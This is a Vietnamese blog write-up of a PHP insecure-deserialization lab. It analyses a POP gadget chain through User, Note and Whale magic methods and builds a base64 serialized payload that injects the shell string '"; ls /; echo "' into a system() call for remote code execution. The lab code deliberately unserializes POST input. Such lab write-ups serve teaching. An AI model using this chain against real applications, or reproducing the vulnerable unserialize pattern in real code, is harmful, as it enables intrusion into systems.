# POP Chain Analysis & Exploit


<!--more-->

## Intro

Trong quá trình nghiên cứu **Insecure Deserialization**, mình nhận được một lab liên quan đến **POP Chain** (Property-Oriented Programming Chain). Đây là một dạng tấn công thú vị: thay vì khai thác hàm hay lệnh trực tiếp, kẻ tấn công kết hợp các *gadget* (các phương thức magic của class) để đạt được mục tiêu — ví dụ thực thi lệnh hệ thống (RCE).

Bài viết này mô tả quá trình mình phân tích và khai thác lab: từ xem qua mã nguồn, nhận diện các gadget hữu dụng, tới cách xây payload để kích hoạt chuỗi gọi (POP chain). Mục tiêu là giúp bạn hiểu được phương pháp tư duy khi xử lý lab kiểu này.

Lab mình thực hiện:
[https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php](https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php)


## Analysis

### Tổng quan mã nguồn

```php {title="lab.php" data-open=true}
<?php
class User{
	public $name;
	private $memo;
	function __construct($name){
		$this->name=$name;
	}
	function __wakeup(){
		$this->memo=new Note($this -> name."say hello", 'test_whale');
	}
	function __get($content){
		return $this->memo;
	}
}
class Note{
	public $content;
	public $whale;
	function __construct($content, $whale){
		$this->content=$content;
		$this->whale=$whale;
	}
	function __toString(){
		$this->record($this->whale, $this->content);
		return 'Record for '.$this->whale.' is : '.$this->content;
	}
	function record($whale, $content){
		//check whether it's an attribute
		$test=$whale->$content;
		if ($test!=NULL){
			echo("It's probably an attribute");
		}
	}
}
class Whale{
	public $name;
	private $note;
	function __construct($name){
		$this->name=$name;
	}
	function take_note($note){
		$this->note=date("Y/m/d H:i:s").$note;
	}
	function __get($attribute){
		system('echo "'.$this->name.'" >> log.txt');
		return $this->$attribute;
	}
	function __toString(){
		return $this->name;
	}
}
if (isset($_POST['pop'])){
	unserialize(base64_decode($_POST['pop']));
}
?>
```

File chính có ba class quan trọng: `User`, `Note`, `Whale`. Cuối file có dòng unserialize đầu vào nếu `$_POST['pop']` được gửi:

```php
if (isset($_POST['pop'])){
    unserialize(base64_decode($_POST['pop']));
}
```

Những điểm đáng chú ý:

* Dòng **8**: `User::__wakeup()` tạo một `Note` và gán vào `$this->memo`.
* Dòng **23**: `Note::__toString()` gọi `record()` rồi trả về một chuỗi.
* Dòng **28**: `Note::record()` truy xuất `$whale->$content`.
* Dòng **44**: `Whale::__get()` gọi `system('echo "'.$this->name.'" >> log.txt');`.
* Dòng **52**: vị trí gọi `unserialize(...)` — điểm tấn công.

### Luồng thực thi dẫn đến shell

1. **Unserialize một `User`**: Khi unserialize một object `User`, magic method `__wakeup()` sẽ chạy. Ở đây `__wakeup()` khởi tạo một `Note` mới bằng cách lấy `$this->name . "say hello"` làm content và `'test_whale'` làm whale:

   ```php
   $this->memo = new Note($this->name . "say hello", 'test_whale');
   ```
2. **`Note::__toString()` sẽ gọi `record()`**: `__toString()` trong `Note` gọi `record($this->whale, $this->content)` trước khi trả về chuỗi. `__toString()` được gọi khi đối tượng bị ép sang chuỗi. Ta lợi dụng `$this->name` làm đối tượng của note sẽ bị ép sang chuỗi khi concat `"say hello"` ở dòng 9.
3. **`record()` truy xuất thuộc tính động trên `$whale`**: Trong `record()` có dòng:

   ```php
   $test = $whale->$content;
   ```

   Nếu `$whale` là một object `Whale` và `$content` không khớp thuộc tính tồn tại, PHP sẽ gọi magic `Whale::__get($attribute)`.
4. **`Whale::__get()` thực thi `system()`**: `__get()` của `Whale` chứa:

   ```php
   system('echo "'.$this->name.'" >> log.txt');
   ```

   Vì `system()` chạy shell, nếu `$this->name` chứa ký tự phá vỡ lệnh (ví dụ `"; ls /; echo "`), attacker có thể chèn và thực thi lệnh shell dẫn tới RCE.

## Exploit
Tạo 1 file tương tự file gốc nhưng chứa code tạo serialize:

```php {title="lab_copy.php" hl_lines=[6,52,53,54]}
<?php
class User{
	public $name;
	private $memo;
	function __construct(){
		$this->name= new Note("Top2",new Whale(('"; ls /; echo "')));
	}
	function __wakeup(){
		$this->memo=new Note($this -> name."say hello", 'test_whale');
	}
	function __get($content){
		return $this->memo;
	}
}
class Note{
	public $content;
	public $whale;
	function __construct($content, $whale){
		$this->content=$content;
		$this->whale=$whale;
	}
	function __toString(){
		$this->record($this->whale, $this->content);
		return 'Record for '.$this->whale.' is : '.$this->content;
	}
	function record($whale, $content){
		//check whether it's an attribute
		$test=$whale->$content;
		if ($test!=NULL){
			echo("It's probably an attribute");
		}
	}
}
class Whale{
	public $name;
	private $note;
	function __construct($name){
		$this->name=$name;
	}
	function take_note($note){
		$this->note=date("Y/m/d H:i:s").$note;
	}
	function __get($attribute){
		system('echo "'.$this->name.'" >> log.txt');
		return $this->$attribute;
	}
	function __toString(){
		return $this->name;
	}
}

$u = new User();
$searialize = serialize($u);
echo base64_encode(''. $searialize .'');
?>
```

Chạy file này và copy chuỗi base64 trả về:

![Base64](base64_return.png "Chuỗi base64 trả về")

Gửi request theo cú pháp challenge

![RCE](result.png "RCE thành công")

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-11-pop-chain-lab1/  

